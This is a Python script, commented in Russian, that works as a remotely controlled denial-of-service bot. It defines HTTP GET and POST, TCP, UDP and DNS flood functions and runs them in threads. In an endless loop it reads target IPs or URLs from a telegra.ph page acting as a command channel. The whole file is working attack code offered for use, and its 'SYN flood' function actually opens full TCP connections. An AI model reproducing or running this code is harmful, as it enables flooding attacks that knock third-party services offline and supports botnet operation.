import requests
import socket
import threading
import time
import re
import random
import string

# Генерация случайного трафика
def generate_random_data(size=1024):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

# Функции для атак

def send_http_get_flood(url, count=100):
    for _ in range(count):
        try:
            response = requests.get(url, timeout=10)
            print(f"GET request sent to {url}, Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error in GET request to {url}: {e}")

def send_tcp_syn_flood(ip, port, count=100):
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))
            sock.sendall(generate_random_data().encode())
            sock.close()
            print(f"TCP SYN request sent to {ip}:{port}")
        except Exception as e:
            print(f"Error in TCP SYN request to {ip}:{port}: {e}")

def send_udp_flood(ip, port, count=100):
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(generate_random_data().encode(), (ip, port))
            print(f"UDP packet sent to {ip}:{port}")
        except Exception as e:
            print(f"Error in UDP packet to {ip}:{port}: {e}")

def send_dns_flood(ip, count=100):
    for _ in range(count):
        try:
            dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dns_socket.sendto(generate_random_data().encode(), (ip, 53))
            print(f"DNS request sent to {ip}")
        except Exception as e:
            print(f"Error in DNS request to {ip}: {e}")

def send_http_post_flood(url, count=100):
    for _ in range(count):
        try:
            response = requests.post(url, data=generate_random_data(), timeout=10)
            print(f"POST request sent to {url}, Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error in POST request to {url}: {e}")

def send_requests(ip, port):
    # Отправка различных атак
    threading.Thread(target=send_http_get_flood, args=(f'http://{ip}',)).start()
    threading.Thread(target=send_tcp_syn_flood, args=(ip, port)).start()
    threading.Thread(target=send_udp_flood, args=(ip, port)).start()
    threading.Thread(target=send_dns_flood, args=(ip,)).start()
    threading.Thread(target=send_http_post_flood, args=(f'http://{ip}',)).start()

def read_page_and_send_requests():
    try:
        response = requests.get('https://telegra.ph/Bot-08-21-8', timeout=10)
        if response.status_code == 200:
            page_text = response.text
            if '/l4 [' in page_text:
                match = re.search(r'/l4 \[(.*?)\]', page_text)
                if match:
                    ip_port = match.group(1).split(':')
                    if len(ip_port) == 1:
                        ip = ip_port[0]
                        port = 80  # по умолчанию порт 80
                    else:
                        ip = ip_port[0]
                        port = int(ip_port[1])
                    threading.Thread(target=send_requests, args=(ip, port)).start()
            elif '/l7 [' in page_text:
                match = re.search(r'/l7 \[(.*?)\]', page_text)
                if match:
                    url_port = match.group(1).split(':')
                    if len(url_port) == 1:
                        url = url_port[0]
                        port = 443  # по умолчанию порт 443
                    else:
                        url = url_port[0]
                        port = int(url_port[1])
                    threading.Thread(target=send_http_post_flood, args=(f'https://{url}',)).start()
        else:
            print("Не удалось получить страницу.")
    except requests.exceptions.RequestException as e:
        print(f"Error reading page: {e}")

def multi_request(ip, port):
    threads = []
    for _ in range(10):  # Отправляем много запросов
        thread = threading.Thread(target=send_requests, args=(ip, port))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

def handle_command(command):
    if command.startswith('/multi'):
        parts = command.split()
        if len(parts) == 3:
            ip = parts[1]
            port = int(parts[2])
            multi_request(ip, port)
        else:
            print('Неверная команда. Используйте: /multi [ip] [port]')

def main():
    while True:
        read_page_and_send_requests()
        time.sleep(0)

if __name__ == '__main__':
    main()